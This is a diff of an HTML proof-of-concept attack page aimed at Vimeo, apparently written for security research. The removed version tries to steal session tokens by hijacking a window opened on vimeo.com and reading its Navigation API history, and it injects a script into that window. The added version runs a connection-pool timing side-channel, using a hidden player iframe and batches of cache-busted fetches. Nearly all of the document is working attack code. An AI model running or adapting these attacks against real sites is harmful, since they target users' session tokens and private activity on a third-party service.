@@ -1,116 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Vimeo Navigation API History Leak</title>
+    <title>Vimeo Timing Attack</title>
 </head>
 <body>
-    <h1>🚨 Vimeo Token Theft via Navigation API</h1>
-    <button onclick="attack()">Start Attack</button>
-    <div id="log"></div>
+    <h1>⏱️ Vimeo Connection Pool Timing Attack</h1>
+    <button onclick="startAttack()">Start Attack</button>
+    <div id="results"></div>
 
     <script>
+        const results = document.getElementById('results');
+        
         function log(msg) {
-            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
+            results.innerHTML += `<p>${msg}</p>`;
             console.log(msg);
         }
-
-        function attack() {
-            log('🎯 Step 1: Opening Vimeo player in new window...');
+        
+        async function startAttack() {
+            log('🎯 Starting timing attack...');
             
-            // Open Vimeo player
-            const vimeoWin = window.open(
-                'https://vimeo.com/home',
-                'vimeoTarget'
-            );
+            // Step 1: Load Vimeo iframe (this makes the auth request)
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://player.vimeo.com/video/935884964';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
-            // Wait for it to load
+            // Step 2: Wait a moment, then start timing measurements
             setTimeout(() => {
-                log('📡 Step 2: Hijacking window to about:blank...');
-                
-                // Change to about:blank (changes ownership!)
-                vimeoWin.location = 'about:blank';
-                
-                setTimeout(() => {
-                    log('🔍 Step 3: Extracting navigation history...');
-                    
-                    try {
-                        // Check if Navigation API is available
-                        if (vimeoWin.navigation && vimeoWin.navigation.entries) {
-                            const entries = vimeoWin.navigation.entries();
-                            
-                            log(`✅ Found ${entries.length} history entries`);
-                            
-                            // Extract URLs from history
-                            entries.forEach((entry, i) => {
-                                const url = new URL(entry.url);
-                                log(`Entry ${i}: ${url.href}`);
-                                
-                                // Check if URL contains tokens
-                                // Sometimes tokens are in URL fragments or query params
-                                if (url.hash.includes('token') || 
-                                    url.search.includes('token') ||
-                                    url.search.includes('session')) {
-                                    log(`🚨 POTENTIAL TOKEN IN URL: ${url.href}`);
-                                }
-                                
-                                // Extract any query parameters
-                                url.searchParams.forEach((value, key) => {
-                                    log(`  ${key}: ${value}`);
-                                });
-                            });
-                            
-                            // Try to access navigation state
-                            if (vimeoWin.navigation.currentEntry) {
-                                const state = vimeoWin.navigation.currentEntry.getState();
-                                log('Navigation state:', JSON.stringify(state));
-                            }
-                            
-                            // CRITICAL: Try to read window.name
-                            log('Window name:', vimeoWin.name);
-                            
-                            // CRITICAL: Try to inject script to extract playerConfig
-                            tryExtractConfig(vimeoWin);
-                            
-                        } else {
-                            log('❌ Navigation API not available');
-                        }
-                    } catch(e) {
-                        log('❌ Error: ' + e.message);
-                    }
-                }, 2000);
-            }, 3000);
+                measureTimings();
+            }, 1000);
         }
         
-        function tryExtractConfig(win) {
-            try {
-                // We now own this window, so we can inject script!
-                const script = win.document.createElement('script');
-                script.textContent = `
-                    // This script runs with about:blank origin
-                    // But navigation.entries() leaked the Vimeo URLs!
+        async function measureTimings() {
+            log('📊 Measuring connection timings...');
+            
+            // Request static resource from player.vimeo.com in blocks of 6
+            const staticResource = 'https://player.vimeo.com/static/proxy.html';
+            const blockSize = 6;
+            const totalRequests = 20;
+            
+            const timings = [];
+            
+            for (let block = 0; block < Math.ceil(totalRequests / blockSize); block++) {
+                const blockTimings = [];
+                const promises = [];
+                
+                for (let i = 0; i < blockSize; i++) {
+                    const requestNum = block * blockSize + i;
+                    if (requestNum >= totalRequests) break;
                     
-                    // Try to navigate back to Vimeo
-                    if (window.navigation && window.navigation.entries().length > 0) {
-                        // Store what we want to extract in window.name
-                        window.name = JSON.stringify({
-                            historyUrls: window.navigation.entries().map(e => e.url)
+                    const start = performance.now();
+                    
+                    // Add cache buster
+                    const url = `${staticResource}?_=${Date.now()}_${requestNum}`;
+                    
+                    const promise = fetch(url, { mode: 'no-cors' })
+                        .then(() => {
+                            const duration = performance.now() - start;
+                            blockTimings.push(duration);
+                            return duration;
+                        })
+                        .catch(e => {
+                            blockTimings.push(null);
+                            return null;
                         });
-                        
-                        // Navigate back to the first entry
-                        window.history.back();
-                    }
-                `;
-                win.document.head.appendChild(script);
+                    
+                    promises.push(promise);
+                }
                 
-                log('✅ Injected script into hijacked window');
+                await Promise.all(promises);
+                timings.push(...blockTimings);
                 
-                // After navigating back, check window.name again
-                setTimeout(() => {
-                    log('Window name after back:', win.name);
-                }, 3000);
-                
-            } catch(e) {
-                log('❌ Script injection failed: ' + e.message);
+                // Small delay between blocks
+                await new Promise(r => setTimeout(r, 100));
+            }
+            
+            analyzeTimings(timings);
+        }
+        
+        function analyzeTimings(timings) {
+            log('📈 Analysis:');
+            
+            timings.forEach((time, i) => {
+                if (time === null) {
+                    log(`Request ${i}: FAILED`);
+                } else {
+                    log(`Request ${i}: ${time.toFixed(2)}ms`);
+                }
+            });
+            
+            // Look for requests that took significantly longer
+            const validTimings = timings.filter(t => t !== null);
+            const avg = validTimings.reduce((a, b) => a + b, 0) / validTimings.length;
+            const stdDev = Math.sqrt(
+                validTimings.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / validTimings.length
+            );
+            
+            log(`Average: ${avg.toFixed(2)}ms`);
+            log(`Std Dev: ${stdDev.toFixed(2)}ms`);
+            
+            // Find outliers (requests that took >133% of average)
+            const outliers = timings
+                .map((time, i) => ({ time, index: i }))
+                .filter(({ time }) => time !== null && time > avg * 1.33);
+            
+            if (outliers.length > 0) {
+                log(`🚨 Found ${outliers.length} slow requests (potential sign of background XHR):`);
+                outliers.forEach(({ time, index }) => {
+                    log(`  Request ${index}: ${time.toFixed(2)}ms (${(time/avg*100).toFixed(0)}% of average)`);
+                });
             }
         }
     </script>
